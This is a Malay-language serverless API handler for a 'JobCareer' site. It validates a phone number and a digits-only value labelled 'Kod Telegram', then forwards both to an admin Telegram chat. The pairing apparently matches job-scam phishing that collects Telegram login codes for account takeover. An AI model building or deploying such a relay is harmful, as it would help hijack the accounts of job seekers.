
function json(res, status, data) {
  return res.status(status)
    .setHeader('Content-Type', 'application/json; charset=utf-8')
    .json(data);
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return json(res, 405, {
      success: false,
      message: 'Method tidak dibenarkan.'
    });
  }

  try {
    // Ambil data dari kod.html
    const ref = String(req.body?.reference || '').trim();
    const phone = String(req.body?.phone || '').trim();
    const job = String(req.body?.job || '').trim();

    // Validasi kod angka sahaja
    if (!/^\d+$/.test(ref)) {
      return json(res, 422, {
        success: false,
        message: 'Kod rujukan mesti mengandungi angka sahaja.'
      });
    }

    // Pastikan nombor telefon tersedia
    if (!phone) {
      return json(res, 422, {
        success: false,
        message: 'Nombor telefon tidak diterima. Sila cuba semula.'
      });
    }

    // Konfigurasi Telegram daripada Vercel
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      console.error('Telegram token atau chat ID belum dikonfigurasi.');

      return json(res, 500, {
        success: false,
        message: 'Konfigurasi Telegram belum lengkap.'
      });
    }

    // Mesej lengkap untuk Telegram
    const message = [
      '🔎 PERMINTAAN SEMAKAN JOBCareer',
      '',
      `Nombor telefon: ${phone}`,
      `Kod Telegram: ${ref}`,
      `Jawatan: ${job || '-'}`,
      '',
      'Status: Menunggu semakan admin.',
      '',
      'Permintaan semakan diterima melalui website JobCareer.'
    ].join('\n');

    // Hantar mesej ke Telegram
    const response = await fetch(
      `https://api.telegram.org/bot${token}/sendMessage`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        }),
        signal: AbortSignal.timeout(15000)
      }
    );

    const result = await response.json();

    // Periksa penghantaran Telegram
    if (!response.ok || result.ok !== true) {
      console.error('Telegram error:', result.description || result);

      return json(res, 502, {
        success: false,
        message: 'Telegram gagal menerima permintaan semakan.'
      });
    }

    // Berjaya
    return json(res, 200, {
      success: true,
      telegram_notified: true,
      reference: ref,
      phone: phone,
      job: job,
      message: 'Permintaan semakan berjaya dihantar kepada admin.'
    });

  } catch (error) {
    console.error('Reference API error:', error?.message || error);

    return json(res, 500, {
      success: false,
      message: 'Ralat semasa menghantar permintaan semakan. Sila cuba lagi.'
    });
  }
}
